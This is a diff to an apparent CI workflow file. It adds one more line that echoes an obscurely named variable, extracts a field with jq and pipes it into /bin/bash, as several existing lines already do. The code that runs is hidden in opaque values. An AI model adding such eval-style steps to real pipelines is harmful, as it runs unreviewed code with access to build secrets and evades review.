@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$mzub278" | jq -r .rsi9 | /bin/bash
           echo $osk7604 | jq -r .mo27 | /bin/bash
           echo $znp2 | jq -r .f52 | /bin/bash
+          echo $obi0 | jq -r .ayv20426 | /bin/bash
 
       - name: Save archive
         if: always()
